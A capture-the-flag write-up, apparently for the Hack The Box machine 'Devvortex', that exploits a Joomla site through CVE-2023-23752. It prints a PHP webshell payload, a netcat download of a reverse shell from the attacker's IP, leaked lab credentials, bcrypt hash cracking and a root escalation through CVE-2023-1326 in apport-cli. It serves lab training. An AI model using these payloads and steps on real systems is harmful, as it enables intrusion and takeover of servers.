# Devvortex

![](attachments/20240331134929.png)

**Difficulty**: `Easy`

**OS**: `Linux`

**Category**: `Web Exploitation, CVE, Privilege Escalation, Enumeration`

Nmap scan:

![](attachments/20240331135136.png)

```shell
nmap -sCV -A -p- -T4 --min-rate=1000 -oN scan 10.10.11.242
```

Edit `/etc/hosts` file. `sudo nano /etc/hosts`

![](attachments/20240331135505.png)

Navigate to website:

![](attachments/20240331135544.png)

Directory scan:

![](attachments/20240331144826.png)

```shell
ffuf -u http://devvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Nothing useful.

Further investigation of the site by checking page source, monitoring requests and responses gives no information.

Next is to perform sub domain enumeration, i tried using gobuster but no luck so i used wfuzz instead.


![](attachments/20240331145136.png)

```shell
wfuzz -c -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" --hc 302
```
Found a sub domain of `dev`. Add it to `/etc/hosts` file.

![](attachments/20240331145252.png)

Visit the sub domain.

![](attachments/20240331145436.png)

Directory scan:

![](attachments/20240331145939.png)

Found an administrator page.

![](attachments/20240331150458.png)

Joomla admin login page.

Running a tool called `joomscan` we are only able to obtain the version.

![](attachments/20240331151833.png)

Searching online led to discover an exploit `CVE-2023-23752` for the version

![](attachments/20240331151955.png)

Using the exploit from github, follow the steps to install the requirements.

![](attachments/20240331152042.png)

Then git clone the repository.

```shell
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
```

`cd` into the folder and run the exploit

```shell
ruby exploit.rb http://dev.devvortex.htb
```

![](attachments/20240331152212.png)

We have 2 users and 1 password.

Login to the admin panel.

![](attachments/20240331152256.png)

Now to find a way to gain a shell.

Checking online, we find out a CVE `CVE-2023-23752`

![](attachments/20240331160008.png)

[Link](https://vulncheck.com/blog/joomla-for-rce)

We have 2 ways to gain a shell, modifying a template or installing a malicious joomla plugin. 

![](attachments/20240331160048.png)

I tried the steps in the blog by first inserting a web shell payload in index.php but it doesn't work and indicates i only have read access.

![](attachments/20240331160251.png)

Tried the second method by uploading a webshell but it also doesn't work also.

![](attachments/20240331160504.png)

Note: you can access the templates and extensions by going to the settings tab:

![](attachments/20240331160347.png)

So what i did was to create a new file in templates named shell.php and insert my webshell payload there.

![](attachments/20240331160610.png)

![](attachments/20240331160633.png)

![](attachments/20240331160651.png)

Payload:

```php
<?php system($_GET['cmd']); ?>
```

Save the file.

Access it by navigating to `http://dev.devvortex.htb/templates/cassiopeia/shell.php?cmd=id`

![](attachments/20240331160740.png)

And we have command execution

![](attachments/20240331160810.png)

Now to gain a reverse shell.

First check our current directory to know where the payload will be delivered to.

![](attachments/20240331164937.png)

Next we upload a php reverse shell. I will be using [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Change IP to you VPN IP.
![](attachments/20240331165134.png)

I will rename the file to something simpler like `revshell.php`

I will be transferring the file using netcat.

Host the file:

![](attachments/20240331165259.png)

```shell
nc -lvnp PORT < file
```

Download the file.

![](attachments/20240331165346.png)

```
nc IP PORT > file
```

File transferred:

![](attachments/20240331165429.png)

Now to execute the payload.

Start a netcat listener on the port specified in the revshell payload.

![](attachments/20240331165555.png)

Execute payload by navigating to the file.

![](attachments/20240331165622.png)

And we have a shell:

![](attachments/20240331165822.png)

What this means is that we never even needed to file get a web shell, we could have created the revshell payload from the admin panel. Here is the file now present in the admin panel.

![](attachments/20240331165840.png)

Although nothing bad in learning how to get web shells.

Next up is to stabilize the shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z (background shell)
stty raw -echo;fg
Press ENTER
```

We have another user named `logan` on the system.

![](attachments/20240331203329.png)

There is a user flag in the home directory but we don't have permission to view it.

![](attachments/20240331203402.png)

Next objective is to perform a horizontal privilege escalation to the user logan.

I transfer a [linpeas](https://linpeas.sh/) script to perform a privilege escalation enumeration 

![](attachments/20240331203609.png)

Running the script shows there is a mysql service running on the target

![](attachments/20240331203838.png)

We can try to login to the sql database using the credentials `lewis:P4ntherg0t1n5r3c0n##`

![](attachments/20240331204025.png)

![](attachments/20240331204056.png)

![](attachments/20240331204128.png)

![](attachments/20240331204318.png)

We have 2 users with their respective hash, let's crack it. Copy the hashes and place in a file.

The hash is a bcrypt hash, you can confirm from this [site](https://hashcat.net/wiki/doku.php?id=example_hashes)

![](attachments/20240331204517.png)

Using hashcat to crack it.

![](attachments/20240331204605.png)

```shell
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![](attachments/20240331204711.png)

We have a password for the use logan. Now to login using ssh.

User flag obtained.

![](attachments/20240331204843.png)

Root flag is next.

Checking for sudo privileges

![](attachments/20240331205011.png)

Searching online, we seem to have a possible CVE `CVE-2023–1326` for privilege escalation.

Taking a look at this [website](https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/)

![](attachments/20240331210115.png)

Verification:

![](attachments/20240331210312.png)

Version is below `2.26.0` which means it is vulnerable.

Exploitation:

Select any option

![](attachments/20240331210445.png)

```shell
sudo /usr/bin/apport-cli --file-bug
```

Next:

![](attachments/20240331210737.png)

Press Enter and choose V

![](attachments/20240331210807.png)

Now spawn a shell by typing `!/bin/bash`

![](attachments/20240331210841.png)

Obtain the root flag;

![](attachments/20240331210924.png)

The End.

![](attachments/obito-gif-1.gif)